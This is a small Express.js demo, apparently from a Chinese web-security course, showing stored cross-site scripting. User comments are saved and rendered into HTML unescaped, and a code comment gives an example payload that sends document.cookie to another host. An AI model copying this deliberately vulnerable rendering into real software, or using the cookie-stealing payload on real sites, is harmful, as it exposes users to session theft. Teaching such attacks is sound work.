/**
 * 珠峰培训 http://www.zhufengpeixun.cn
 */
let express = require('express');
let app = express();
let comment;
//添加评论
//
// http://localhost:8080/comment?comment=<script>location.href='http://localhost:9090?cookie='+document.cookie</script>
app.get('/comment',function(req,res){
  comment = req.query.comment;
  res.send('ok');
});
//显示评论
app.get('/',function(req,res){
 res.header('Content-Type','text/html;charset=utf-8');
 res.send(`
 <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
</head>
<body>
${comment}
</body>
</html>
 `);
});

app.listen(8080);